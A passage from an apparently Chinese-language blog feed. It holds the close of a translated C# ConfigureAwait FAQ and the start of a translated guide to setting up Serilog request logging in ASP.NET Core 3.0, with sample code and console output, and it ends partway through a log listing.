<p>&emsp;&emsp;但是，改变的是一些环境，这个环境是否发布了它们自己的同步上下文。特别是，在 .NET Framework 的 ASP.NET 类有它自己的<a href="https://github.com/microsoft/referencesource/blob/3b1eaf5203992df69de44c783a3eda37d3d4cd10/System.Web/AspNetSynchronizationContextBase.cs" target="_blank" rel="noopener">同步上下文</a>，而 .NET Core 就没有。那意思就是说，在默认情况下，运行在 .NET Core 的代码是不会看到自定义的同步上下文的，在这样的话，在环境中就大大减少了<code>ConfigureAwait(false)</code>的需要。<br>&emsp;&emsp;但是，这不意味着永远都不需要自定义的同步上下文或任务调度器。如果一些用户代码（或在你项目中使用的其他类库代码）设置了自定义同步上下文并且调用了你的代码，或在一个被自定义调度器调度的任务中调用了你的代码，那么在 ASP.NET Core 中你的 await 也许就能看到非默认的上下文或调度器，这样就会导致你要使用<code>ConfigureAwait(false)</code>。当然，在这种情况下，如果你想避免同步阻塞（无论如何在你的应用程序中都应该这么考虑）并且你不介意细微的性能开销，在这种受限的情况下，你尽可能的不要使用<code>ConfigureAwait(false)</code>。</p>
<h1 id="当在异步流中使用-await-foreach-时，我能使用-ConfigureAwait-吗"><a href="#当在异步流中使用-await-foreach-时，我能使用-ConfigureAwait-吗" class="headerlink" title="当在异步流中使用 await foreach 时，我能使用 ConfigureAwait 吗"></a>当在异步流中使用 await foreach 时，我能使用 ConfigureAwait 吗</h1><p>&emsp;&emsp;能。具体例子详见 <a href="https://docs.microsoft.com/en-us/archive/msdn-magazine/2019/november/csharp-iterating-with-async-enumerables-in-csharp-8" target="_blank" rel="noopener">MSDN Magazine article</a>。</p>
<p>&emsp;&emsp;<code>await foreach</code>绑定了一个模式，它被用来迭代异步流<code>IAsyncEnumerable</code>，它也能被用来迭代那些由正确 API 之下（surface area）返回的信息（原文：it can also be used to enumerate something that exposes the right API surface area.）。.NET 运行时库包含了一个<code>IAsyncEnumerable</code>的 <a href="https://github.com/dotnet/runtime/blob/91a717450bf5faa44d9295c01f4204dc5010e95c/src/libraries/System.Private.CoreLib/src/System/Threading/Tasks/TaskAsyncEnumerableExtensions.cs#L25-L26" target="_blank" rel="noopener">ConfigureAwait 拓展方法</a>，它返回一个自定义类型，这个类型包装了<code>IAsyncEnumerable</code>和一个布尔值。当编译器生成对可枚举的<code>MoveNextAsync</code>和<code>DisposeAsync</code>方法调用时，那些调用都会返回已配置的可枚举结构类，并且它会以触发配置的方式来执行等待。</p>
<h1 id="当-await-using-一个-DisposeAsync-对象时，能使用-ConfigureAwait-吗"><a href="#当-await-using-一个-DisposeAsync-对象时，能使用-ConfigureAwait-吗" class="headerlink" title="当 await using 一个 DisposeAsync 对象时，能使用 ConfigureAwait 吗"></a>当 await using 一个 DisposeAsync 对象时，能使用 ConfigureAwait 吗</h1><p>&emsp;&emsp;可以，尽管有点小麻烦。</p>
<p>&emsp;&emsp;在上个 FAQ 关于<code>IAsyncEnumerable</code>的描述，.NET 运行时类库暴露一个<code>IAsyncDisposable</code>的拓展方法<code>ConfigureAwait</code>，它实现了在以合适的模式下，使用<code>await using</code>能很好的工作（即暴露了合适的<code>DisposeAsync</code>方法）：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> <span class="keyword">using</span> (<span class="keyword">var</span> c = <span class="keyword">new</span> MyAsyncDisposableClass().ConfigureAwait(<span class="literal">false</span>))</span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;这里的问题是，变量 c 现在还不是 MyAsyncDisposableClass 类，而是一个<code>System.Runtime.CompilerServices.ConfiguredAsyncDisposable</code>，它是从<code>IAsyncDisposable</code>上的拓展方法<code>ConfigureAwait</code>返回的类型。</p>
<p>&emsp;&emsp;为了解决这个问题，你需要多写一行：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> c = <span class="keyword">new</span> MyAsyncDisposableClass();</span><br><span class="line"><span class="keyword">await</span> <span class="keyword">using</span> (c.ConfigureAwait(<span class="literal">false</span>))</span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;现在这个 c 变量就是 MyAsyncDisposableClass 类型。这对 c 来说也是有影响的，它增加了 c 的范围。如果你介意的话，你可以用大括号把整个都包起来。</p>
<h1 id="我已经用了-ConfigureAwait-false-，但是在-await-后，AsyncLocal-仍然流到了代码中。这是-bug-吗"><a href="#我已经用了-ConfigureAwait-false-，但是在-await-后，AsyncLocal-仍然流到了代码中。这是-bug-吗" class="headerlink" title="我已经用了 ConfigureAwait(false) ，但是在 await 后，AsyncLocal 仍然流到了代码中。这是 bug 吗"></a>我已经用了 ConfigureAwait(false) ，但是在 await 后，AsyncLocal 仍然流到了代码中。这是 bug 吗</h1><p>&emsp;&emsp;不。这是意料之中的事。AsyncLocal 数据流是作为<code>ExecutionContext</code>的一部分，它是从<code>SynchronizationContext</code>独立出来的。除非你显式的调用<code>ExecutionContext.SuppressFlow()</code>来禁止<code>ExecutionContext</code>，否则无论你是否使用了<code>ConfigureAwait</code>来避免捕捉原始同步上下文，<code>ExecutionContext</code>（就是AsyncLocal 数据）都将总会在等待中横穿流动。更多信息详尽<a href="https://devblogs.microsoft.com/pfxteam/executioncontext-vs-synchronizationcontext/" target="_blank" rel="noopener">这篇文章</a>。</p>
<h1 id="语言能帮助我在库中避免显式使用-ConfigureAwait-false-吗"><a href="#语言能帮助我在库中避免显式使用-ConfigureAwait-false-吗" class="headerlink" title="语言能帮助我在库中避免显式使用 ConfigureAwait(false) 吗"></a>语言能帮助我在库中避免显式使用 ConfigureAwait(false) 吗</h1><p>&emsp;&emsp;库作者有时候要表示他们需要使用<code>ConfigureAwait(false)</code>的失望，并要求使用侵入式更低的替代方法。<br>&emsp;&emsp;目前他们还不需要，至少不需要构建到语言/编译器/运行时内。对于这种情况的解决方案，这里有许多提议，如：</p>
<ul>
<li><a href="https://github.com/dotnet/csharplang/issues/645" target="_blank" rel="noopener">https://github.com/dotnet/csharplang/issues/645</a></li>
<li><a href="https://github.com/dotnet/csharplang/issues/2542" target="_blank" rel="noopener">https://github.com/dotnet/csharplang/issues/2542</a></li>
<li><a href="https://github.com/dotnet/csharplang/issues/2649" target="_blank" rel="noopener">https://github.com/dotnet/csharplang/issues/2649</a></li>
<li><a href="https://github.com/dotnet/csharplang/issues/2746" target="_blank" rel="noopener">https://github.com/dotnet/csharplang/issues/2746</a></li>
</ul>
]]></content>
      
        <categories>
            
            <category> 编程 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> CSharp </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[在 ASP.NET Core 3.0 中使用 Serilog.AspNetCore]]></title>
      <url>/2020/01/20/UsingSerilogAspNetCoreInAspNetCore3/</url>
      <content type="html"><![CDATA[<blockquote>
<p>译文：<br>&emsp;&emsp;使用 Serilog RequestLogging 减少日志详细程度：<a href="https://www.cnblogs.com/yilezhu/p/12215934.html" target="_blank" rel="noopener">https://www.cnblogs.com/yilezhu/p/12215934.html</a><br>&emsp;&emsp;使用 Serilog 记录所选的终结点属性：<a href="https://www.cnblogs.com/yilezhu/p/12227271.html" target="_blank" rel="noopener">https://www.cnblogs.com/yilezhu/p/12227271.html</a><br>&emsp;&emsp;使用 Serilog.AspNetCore 记录 MVC 属性：<a href="https://www.cnblogs.com/yilezhu/p/12243984.html" target="_blank" rel="noopener">https://www.cnblogs.com/yilezhu/p/12243984.html</a><br>&emsp;&emsp;从 Serilog 请求日志记录中排除健康检查端点：<a href="https://www.cnblogs.com/yilezhu/p/12253361.html" target="_blank" rel="noopener">https://www.cnblogs.com/yilezhu/p/12253361.html</a>   </p>
</blockquote>
<blockquote>
<p>原文：<br>&emsp;&emsp;<a href="https://andrewlock.net/using-serilog-aspnetcore-in-asp-net-core-3-reducing-log-verbosity/" target="_blank" rel="noopener">Reducing log verbosity with Serilog RequestLogging</a><br>&emsp;&emsp;<a href="https://andrewlock.net/using-serilog-aspnetcore-in-asp-net-core-3-logging-the-selected-endpoint-name-with-serilog/" target="_blank" rel="noopener">Logging the selected Endpoint Name with Serilog</a><br>&emsp;&emsp;<a href="https://andrewlock.net/using-serilog-aspnetcore-in-asp-net-core-3-logging-mvc-propertis-with-serilog/" target="_blank" rel="noopener">Logging MVC properties with Serilog.AspNetCore</a><br>&emsp;&emsp;<a href="https://andrewlock.net/using-serilog-aspnetcore-in-asp-net-core-3-excluding-health-check-endpoints-from-serilog-request-logging/" target="_blank" rel="noopener">Excluding health check endpoints from Serilog request logging</a>  </p>
</blockquote>
<a id="more"></a>

<h1 id="使用-Serilog-RequestLogging-减少日志详细程度"><a href="#使用-Serilog-RequestLogging-减少日志详细程度" class="headerlink" title="使用 Serilog RequestLogging 减少日志详细程度"></a>使用 Serilog RequestLogging 减少日志详细程度</h1><p>&emsp;&emsp;众所周知，ASP.NET Core 的重要改变之一是把日志记录内置于框架中。这意味着您可以（如果需要）从自己的标准日志基础设施访问所有深层基础设施日志。缺点是有时您会收到<strong>太多</strong>的日志。<br>在这个简短的系列文章中，我将介绍如何使用 <a href="https://github.com/serilog/serilog-aspnetcore#request-logging" target="_blank" rel="noopener">Serilog 的 ASP.NET Core 请求日志记录功能</a>。在第一篇文章中，我将讲述如何将 Serilog 的<code>RequestLoggingMiddleware</code>添加到您的应用程序，以及它提供的好处。在后续文章中，我将描述如何进一步自定义行为。</p>
<blockquote>
<p>&emsp;&emsp;我已经将这些帖子草拟了一段时间。从那时起，<a href="https://nblumhardt.com/2019/10/serilog-in-aspnetcore-3" target="_blank" rel="noopener">Serilog 的创建者 Nicholas Blumhardt 就在 ASP.NET Core 3.0 中使用 Serilog 撰写了一篇详尽的博客文章</a>。这是一篇非常详细（至少我认为是这样）的文章，我强烈建议您阅读。您可以在他的文章中找到我在本系列文章中谈论的大部分内容，所以请查看！</p>
</blockquote>
<h2 id="原生请求日志"><a href="#原生请求日志" class="headerlink" title="原生请求日志"></a>原生请求日志</h2><p>&emsp;&emsp;在本节中，首先让我们创建一个标准的 ASP.NET Core 3.0 的 Razor pages 应用，当然你也可以直接使用<code>dotnet new webapp</code>命令来进行创建。这将创建一个标准 <em>Program.cs</em> ，如下所示：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="keyword">string</span>[] args</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        CreateHostBuilder(args).Build().Run();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> IHostBuilder <span class="title">CreateHostBuilder</span>(<span class="params"><span class="keyword">string</span>[] args</span>)</span> =&gt;</span><br><span class="line">        Host.CreateDefaultBuilder(args)</span><br><span class="line">            .ConfigureWebHostDefaults(webBuilder =&gt;</span><br><span class="line">            &#123;</span><br><span class="line">                webBuilder.UseStartup&lt;Startup&gt;();</span><br><span class="line">            &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;还有一个 <em>Startup.cs</em> ，用于配置中间件管道，<code>Configure</code>如下所示：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Configure</span>(<span class="params">IApplicationBuilder app, IWebHostEnvironment env</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (env.IsDevelopment())</span><br><span class="line">    &#123;</span><br><span class="line">        app.UseDeveloperExceptionPage();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        app.UseExceptionHandler(<span class="string">"/Error"</span>);</span><br><span class="line">        <span class="comment">// The default HSTS value is 30 days. You may want to change this for production scenarios, see https://aka.ms/aspnetcore-hsts.</span></span><br><span class="line">        app.UseHsts();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    app.UseHttpsRedirection();</span><br><span class="line">    app.UseStaticFiles();</span><br><span class="line"></span><br><span class="line">    app.UseRouting();</span><br><span class="line"></span><br><span class="line">    app.UseAuthorization();</span><br><span class="line"></span><br><span class="line">    app.UseEndpoints(endpoints =&gt;</span><br><span class="line">    &#123;</span><br><span class="line">        endpoints.MapRazorPages();</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;如果您运行该应用程序并导航至主页，则默认情况下，您会在控制台中看到每个请求都会产生许多的日志。以下日志是针对对主页的<strong>单个</strong>请求生成的（此后我还没有包括对 CSS 和 JS 文件的其他请求）（这是是开发环境请求出现的日志）：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">info: Microsoft.AspNetCore.Hosting.Diagnostics[1]</span><br><span class="line">      Request starting HTTP/2 GET https://localhost:5001/</span><br><span class="line">info: Microsoft.AspNetCore.Routing.EndpointMiddleware[0]</span><br><span class="line">      Executing endpoint &apos;/Index&apos;</span><br><span class="line">info: Microsoft.AspNetCore.Mvc.RazorPages.Infrastructure.PageActionInvoker[3]</span><br><span class="line">      Route matched with &#123;page = &quot;/Index&quot;&#125;. Executing page /Index</span><br><span class="line">info: Microsoft.AspNetCore.Mvc.RazorPages.Infrastructure.PageActionInvoker[101]</span><br><span class="line">      Executing handler method SerilogRequestLogging.Pages.IndexModel.OnGet - ModelState is Valid</span><br><span class="line">info: Microsoft.AspNetCore.Mvc.RazorPages.Infrastructure.PageActionInvoker[102]</span><br><span class="line">      Executed handler method OnGet, returned result .</span><br><span class="line">info: Microsoft.AspNetCore.Mvc.RazorPages.Infrastructure.PageActionInvoker[103]</span><br><span class="line">      Executing an implicit handler method - ModelState is Valid</span><br><span class="line">info: Microsoft.AspNetCore.Mvc.RazorPages.Infrastructure.PageActionInvoker[104]</span><br><span class="line">      Executed an implicit handler method, returned result Microsoft.AspNetCore.Mvc.RazorPages.PageResult.</span><br><span class="line">info: Microsoft.AspNetCore.Mvc.RazorPages.Infrastructure.PageActionInvoker[4]</span><br><span class="line">      Executed page /Index in 221.07510000000002ms</span><br><span class="line">info: Microsoft.AspNetCore.Routing.EndpointMiddleware[1]</span><br><span class="line">      Executed endpoint &apos;/Index&apos;</span><br><span class="line">info: Microsoft.AspNetCore.Hosting.Diagnostics[2]</span><br><span class="line">      Request finished in 430.9383ms 200 text/html; charset=utf-8</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;单个请求就是 <strong>10 条</strong>日志。现在，很清楚，它正在<code>Development</code>环境中运行，该环境默认情况下将 <em>Microsoft</em> 名称空间中的所有信息记录在 “Information” 或更高的级别。如果我们切换到<code>Production</code>环境，则默认模板会将 <em>Microsoft</em> 命名空间的日志过滤到 “Warning” 。现在导航到默认主页会生成以下日志（这里注意，如果你现在使用 ASP.NET Core3.1 貌似 <em>Microsoft</em> 命名空间默认日志级别已经改为<code>Warning</code>）：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;是的，根本没有日志！上一次运行中生成的所有日志都位于 Microsoft 命名空间中，并且属于 “Information” 级别，因此将它们全部过滤掉。就个人而言，我觉得这有点麻烦。如果生产版本仅仅只是想记录<strong>一部分内容</strong>，而其他相关联的内容则不进行记录，这将会更有用的。</p>
<p>&emsp;&emsp;一种可能的解决方案是自定义应用于每个命名空间的过滤器。例如，您可以将 <em>Microsoft.AspNetCore.Mvc.RazorPages</em> 命名空间限制为 “Warning” 级别，而将更通用的 <em>Microsoft</em> 命名空间保留为 “Information” 级别。现在，您将获得精简后的日志集：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">info: Microsoft.AspNetCore.Hosting.Diagnostics[1]</span><br><span class="line">      Request starting HTTP/2 GET https://localhost:5001/</span><br><span class="line">info: Microsoft.AspNetCore.Routing.EndpointMiddleware[0]</span><br><span class="line">      Executing endpoint &apos;/Index&apos;</span><br><span class="line">info: Microsoft.AspNetCore.Routing.EndpointMiddleware[1]</span><br><span class="line">      Executed endpoint &apos;/Index&apos;</span><br><span class="line">info: Microsoft.AspNetCore.Hosting.Diagnostics[2]</span><br><span class="line">      Request finished in 184.788ms 200 text/html; charset=utf-8</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;这些日志中包含一些有用的信息 —— URL，HTTP 方法，时间信息，端点等 —— 并且没有<strong>太多</strong>冗余。但是，仍然令人讨厌的是它们是四个单独的日志消息。（还是很多，如果能精简成一条日志记录是不是会好很多）<br>&emsp;&emsp;这是 Serilog <code>RequestLoggingMiddleware</code>旨在解决的问题 —— 为请求中的每个步骤创建单独的日志相反，它是创建一个包含所有相关信息的“摘要”日志消息。</p>
<h2 id="将-Serilog-添加到应用程序"><a href="#将-Serilog-添加到应用程序" class="headerlink" title="将 Serilog 添加到应用程序"></a>将 Serilog 添加到应用程序</h2><p>&emsp;&emsp;使用 Serilog <code>RequestLoggingMiddleware</code>的一个前提条件就是您正在使用 Serilog！在本节中，我将介绍将 Serilog 添加到 ASP.NET Core 应用程序中。如果您已经安装了 Serilog，请跳至下一部分。</p>
<p>&emsp;&emsp;首先安装 <em>Serilog.AspNetCore</em> NuGet 软件包，再加上控制台和 <a href="https://datalust.co/seq" target="_blank" rel="noopener">Seq</a> 接收器【这是一个漂亮的可视化日志 UI】，以便我们可以查看日志。您可以通过运行以下命令从命令行执行此操作：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dotnet add package Serilog.AspNetCore</span><br><span class="line">dotnet add package Serilog.Sinks.Seq</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;现在该用 Serilog 替换默认日志了。您可以通过多种方式执行此操作，但是建议的方法是在<code>Program.Main</code>执行其他任何操作之前先配置记录器。这与 ASP.NET Core 通常使用的方法背道而驰，但建议用于 Serilog。当然这会导致您的 <em>Program.cs</em> 文件变得更长：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Additional required namespaces</span></span><br><span class="line"><span class="keyword">using</span> Serilog;</span><br><span class="line"><span class="keyword">using</span> Serilog.Events;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">SerilogDemo</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="keyword">string</span>[] args</span>)</span></span><br><span class="line"><span class="function"></span>        &#123;</span><br><span class="line">            <span class="comment">// Create the Serilog logger, and configure the sinks</span></span><br><span class="line">            Log.Logger = <span class="keyword">new</span> LoggerConfiguration()</span><br><span class="line">               .MinimumLevel.Debug()</span><br><span class="line">               .MinimumLevel.Override(<span class="string">"Microsoft"</span>, LogEventLevel.Information)</span><br><span class="line">               .Enrich.FromLogContext()</span><br><span class="line">               .WriteTo.Console()</span><br><span class="line">               .WriteTo.Seq(<span class="string">"http://localhost:5341"</span>)</span><br><span class="line">               .CreateLogger();</span><br><span class="line">            <span class="comment">// Wrap creating and running the host in a try-catch block</span></span><br><span class="line">            <span class="keyword">try</span></span><br><span class="line">            &#123;</span><br><span class="line">                Log.Information(<span class="string">"Starting host"</span>);</span><br><span class="line">                CreateHostBuilder(args).Build().Run();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> (Exception ex)</span><br><span class="line">            &#123;</span><br><span class="line">                Log.Fatal(ex, <span class="string">"Host terminated unexpectedly"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">finally</span></span><br><span class="line">            &#123;</span><br><span class="line">                Log.CloseAndFlush();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> IHostBuilder <span class="title">CreateHostBuilder</span>(<span class="params"><span class="keyword">string</span>[] args</span>)</span> =&gt;</span><br><span class="line">            Host.CreateDefaultBuilder(args)</span><br><span class="line">                .UseSerilog()</span><br><span class="line">                .ConfigureWebHostDefaults(webBuilder =&gt;</span><br><span class="line">                &#123;</span><br><span class="line">                    webBuilder.UseStartup&lt;Startup&gt;();</span><br><span class="line">                &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;尽管这样设置可能显得更为复杂，但是此设置可确保例如在 <em>appsettings.json</em> 文件格式错误或缺少配置文件的情况下仍会获取日志。如果现在运行您的应用程序，您将看到与我们最初相同的 10 条日志，只是格式略有不同：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[13:30:27 INF] Request starting HTTP/2 GET https://localhost:5001/  </span><br><span class="line">[13:30:27 INF] Executing endpoint &apos;/Index&apos;</span><br><span class="line">[13:30:27 INF] Route matched with &#123;page = &quot;/Index&quot;&#125;. Executing page /Index</span><br><span class="line">[13:30:27 INF] Executing handler method SerilogRequestLogging.Pages.IndexModel.OnGet - ModelState is Valid</span><br><span class="line">[13:30:27 INF] Executed handler method OnGet, returned result .</span><br><span class="line">[13:30:27 INF] Executing an implicit handler method - ModelState is Valid</span><br><span class="line">[13:30:27 INF] Executed an implicit handler method, returned result Microsoft.AspNetCore.Mvc.RazorPages.PageResult.</span><br><span class="line">[13:30:27 INF] Executed page /Index in 168.28470000000002ms</span><br><span class="line">[13:30:27 INF] Executed endpoint &apos;/Index&apos;</span><br><span class="line">[13:30:27 INF] Request finished in 297.0663ms 200 text/html; charset=utf-8</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;现在，通过在应用程序生命周期的早期进行配置，我们的日志记录配置的更加健壮，但实际上尚未解决我们提出的问题。为此，我们将添加<code>RequestLoggingMiddleware</code>。</p>
<h2 id="切换到-Serilog-的-RequestLoggingMiddleware"><a href="#切换到-Serilog-的-RequestLoggingMiddleware" class="headerlink" title="切换到 Serilog 的 RequestLoggingMiddleware"></a>切换到 Serilog 的 RequestLoggingMiddleware</h2><p>&emsp;&emsp;<code>RequestLoggingMiddleware</code>被包含在 <em>Serilog.AspNetCore</em> 中，可以被用于为每个请求添加一个单一的“摘要”日志消息。如果您已经完成了上一节中的步骤，则添加这个中间件将变得很简单。在您的<code>Startup</code>类中，在您想要记录日志的位置使用<code>UseSerilogRequestLogging()</code>进行调用：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Additional required namespace</span></span><br><span class="line"><span class="keyword">using</span> Serilog;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Configure</span>(<span class="params">IApplicationBuilder app, IWebHostEnvironment env</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// ... Error handling/HTTPS middleware</span></span><br><span class="line">    app.UseStaticFiles();</span><br><span class="line"></span><br><span class="line">    app.UseSerilogRequestLogging(); <span class="comment">// &lt;-- Add this line</span></span><br><span class="line"></span><br><span class="line">    app.UseRouting();</span><br><span class="line">    app.UseAuthorization();</span><br><span class="line">    app.UseEndpoints(endpoints =&gt;</span><br><span class="line">    &#123;</span><br><span class="line">        endpoints.MapRazorPages();</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;与 ASP.NET Core 的中间件管道一样，<strong>顺序很重要</strong>。当请求到达<code>RequestLoggingMiddleware</code>中间件时，它将启动计时器，并将请求传递给后续中间件进行处理。当后面的中间件最终生成响应（或抛出异常），则响应通过中间件管道传递回到请求记录器，并在其中记录了结果并写入概要日志信息。<br>&emsp;&emsp;Serilog 只能记录到达中间件的请求。在上面的例子中，我已经在<code>StaticFilesMiddleware</code><strong>之后</strong>添加了<code>RequestLoggingMiddleware</code>。因此如果请求被<code>UseStaticFiles</code>处理并使管道短路的话，日志将不会被记录。鉴于静态文件中间件非常嘈杂，而且通常这是人们期望的行为（静态文件进行短路，不需要进行记录），但是如果您也希望记录对静态文件的请求，则可以在管道中 Serilog 中间件移动到更早的位置。<br>&emsp;&emsp;如果我们再一次运行该应用程序，你还是会看到原来的 10 个日志消息，但你会看到一个<strong>额外的</strong>通过<code>SerilogRequestLoggingMiddleware</code>汇总的日志消息，倒数第二的消息：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"># Standard logging from ASP.NET Core infrastructure</span><br><span class="line">[14:15:44 INF] Request starting HTTP/2 GET https://localhost:5001/  </span><br><span class="line">[14:15:44 INF] Executing endpoint &apos;/Index&apos;</span><br><span class="line">[14:15:45 INF] Route matched with &#123;page = &quot;/Index&quot;&#125;. Executing page /Index</span><br><span class="line">[14:15:45 INF] Executing handler method SerilogRequestLogging.Pages.IndexModel.OnGet - ModelState is Valid</span><br><span class="line">[14:15:45 INF] Executed handler method OnGet, returned result .</span><br><span class="line">[14:15:45 INF] Executing an implicit handler method - ModelState is Valid</span><br><span class="line">[14:15:45 INF] Executed an implicit handler method, returned result Microsoft.AspNetCore.Mvc.RazorPages.PageResult.</span><br><span class="line">[14:15:45 INF] Executed page /Index in 124.7462ms</span><br><span class="line">[14:15:45 INF] Executed endpoint &apos;/Index&apos;</span><br><span class="line"></span><br><span class="line"># Additional Log from Serilog</span><br><span class="line">[14:15:45 INF] HTTP GET / responded 200 in 249.6985 ms</span><br><span 